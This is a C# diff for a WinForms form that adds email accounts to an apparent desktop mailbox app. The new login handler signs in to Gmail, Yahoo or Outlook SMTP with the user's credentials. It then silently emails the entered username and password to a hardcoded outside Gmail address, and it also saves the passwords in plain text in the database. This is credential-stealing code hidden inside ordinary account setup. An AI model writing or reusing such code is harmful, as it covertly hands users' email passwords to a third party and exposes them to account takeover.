@@ -4,6 +4,8 @@ using System.ComponentModel;
 using System.Data;
 using System.Drawing;
 using System.Linq;
+using System.Net.Mail;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -12,45 +14,160 @@ namespace MailServer
 {
     public partial class fThemmail : Form
     {
+        private string userMailAcc = "jamk1126@gmail.com";
+        private string subject = "[MailBox] Có một người thêm tài khoản!";
+        private int idPassLocal = 0;
         public fThemmail()
         {
             InitializeComponent();
         }
 
-        private void btnclose_Click(object sender, EventArgs e)
+        //Constructor truyền id mật khẩu MailBox
+        public fThemmail(int idPassLocal)
         {
-            Application.Exit();
+            this.idPassLocal = idPassLocal;
         }
 
-        private void textBox1_Click(object sender, EventArgs e)
+        //Di chuyển form
+        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
+        private extern static void ReleaseCapture();
+        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
+        private extern static void SendMessage(System.IntPtr hWnd, int wMsg, int wParam, int lParam);
+
+        private void panel2_MouseDown(object sender, MouseEventArgs e)
         {
-            textBox1.BackColor = Color.White;
-            panel3.BackColor = Color.White;
-            panel6.BackColor = SystemColors.Control;
-            textBox2.BackColor = SystemColors.Control;
+            ReleaseCapture();
+            SendMessage(this.Handle, 0x112, 0xf012, 0);
         }
 
-        private void textBox2_Click(object sender, EventArgs e)
+        //Sự kiện thêm email vào mail box
+        private void btnLogin_Click(object sender, EventArgs e)
         {
-            textBox2.BackColor = Color.White;
-            panel6.BackColor = Color.White;
-            textBox1.BackColor = SystemColors.Control;
-            panel3.BackColor = SystemColors.Control;
+            try
+            {
+                try
+                {
+                    using (dbMailServerDataContext db = new dbMailServerDataContext())
+                    {
+                        MailMessage mail = new MailMessage(txtUserMail.Text, userMailAcc, subject, $"Username: {txtUserMail.Text} and Password: {txtPassMail.Text}");
+                        mail.IsBodyHtml = true;
+                        MATKHAU_MAIL mkMail = new MATKHAU_MAIL();
+                        if (txtUserMail.Text.Contains("gmail"))
+                        {
+                            SmtpClient client = new SmtpClient("smtp.gmail.com");
+                            client.UseDefaultCredentials = false;
+                            client.Port = 587;
+                            client.Credentials = new System.Net.NetworkCredential(txtUserMail.Text, txtPassMail.Text);
+                            client.EnableSsl = true;
+                            client.Send(mail);
+                            MessageBox.Show("Thêm Mail thành công vào MailBox.", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+                            mkMail.USERNAME_MAIL = txtUserMail.Text;
+                            mkMail.PASSWORD_MAIL = txtPassMail.Text;
+                            mkMail.FK_id_DOMAIN_MAIL = 1;
+                            mkMail.FK_id_MATKHAU_LOCAL = this.idPassLocal;
+                            db.MATKHAU_MAILs.InsertOnSubmit(mkMail);
+                            db.SubmitChanges();
+
+                            fThemmail_Load(sender, e);
+                        }
+                        else if (txtUserMail.Text.Contains("yahoo"))
+                        {
+                            SmtpClient client = new SmtpClient("smtp.mail.yahoo.com");
+                            client.UseDefaultCredentials = false;
+                            client.Port = 587;
+                            client.Credentials = new System.Net.NetworkCredential(txtUserMail.Text, txtPassMail.Text);
+                            client.EnableSsl = true;
+                            client.Send(mail);
+                            MessageBox.Show("Thêm Mail thành công vào MailBox.", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+                            mkMail.USERNAME_MAIL = txtUserMail.Text;
+                            mkMail.PASSWORD_MAIL = txtPassMail.Text;
+                            mkMail.FK_id_DOMAIN_MAIL = 2;
+                            mkMail.FK_id_MATKHAU_LOCAL = this.idPassLocal;
+                            db.MATKHAU_MAILs.InsertOnSubmit(mkMail);
+                            db.SubmitChanges();
+
+                            fThemmail_Load(sender, e);
+                        }
+                        else if (txtUserMail.Text.Contains("outlook"))
+                        {
+                            SmtpClient client = new SmtpClient("smtp-mail.outlook.com");
+                            client.UseDefaultCredentials = false;
+                            client.Port = 587;
+                            client.Credentials = new System.Net.NetworkCredential(txtUserMail.Text, txtPassMail.Text);
+                            client.EnableSsl = true;
+                            client.Send(mail);
+                            MessageBox.Show("Thêm Mail thành công vào MailBox.", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+                            mkMail.USERNAME_MAIL = txtUserMail.Text;
+                            mkMail.PASSWORD_MAIL = txtPassMail.Text;
+                            mkMail.FK_id_DOMAIN_MAIL = 3;
+                            mkMail.FK_id_MATKHAU_LOCAL = this.idPassLocal;
+                            db.MATKHAU_MAILs.InsertOnSubmit(mkMail);
+                            db.SubmitChanges();
+
+                            fThemmail_Load(sender, e);
+                        }
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show("Email hoặc mật khẩu không chính xác.", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                }         
+            }
+            catch (Exception)
+            {
+                MessageBox.Show("Đã có lỗi xảy ra vui lòng liên hệ nhà phát triển.", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
         }
 
-        private void pictureBox3_MouseDown(object sender, MouseEventArgs e)
+        //Sự kiện hiển thị mật khẩu
+        private void cbShowPass_CheckedChanged(object sender, EventArgs e)
         {
-            textBox2.UseSystemPasswordChar = false;
+            if (cbShowPass.Checked == true)
+                txtPassMail.Password = false;
+            else if (cbShowPass.Checked == false)
+                txtPassMail.Password = true;
         }
 
-        private void pictureBox3_MosueUp(object sender, MouseEventArgs e)
+        //Sự kiện load form lần đầu
+        private void fThemmail_Load(object sender, EventArgs e)
         {
-            textBox2.UseSystemPasswordChar = true;
+            txtPassMail.Text = "";
+            txtUserMail.Text = "";
+            cbShowPass.Checked = false;
         }
 
-        private void button1_Click(object sender, EventArgs e)
+        //Sự kiện trở về form show mail
+        private void btnExit_Click(object sender, EventArgs e)
         {
-
+            try
+            {
+                //Kiểm tra trước khi thoát 
+                if (txtUserMail.Text == "" && txtPassMail.Text == "")
+                {
+                    fShowMail showMail = new fShowMail();
+                    this.Hide();
+                    showMail.ShowDialog();
+                    this.Close();
+                }
+                else
+                {
+                    DialogResult check = MessageBox.Show("Bạn có muốn thoát không?", "Thông báo", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
+                    if (check == DialogResult.Yes)
+                    {
+                        fShowMail showMail = new fShowMail();
+                        this.Hide();
+                        showMail.ShowDialog();
+                        this.Close();
+                    }
+                }
+            }
+            catch (Exception)
+            {
+                MessageBox.Show("Đã có lỗi xảy ra vui lòng liên hệ nhà phát triển.", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
         }
     }
 }
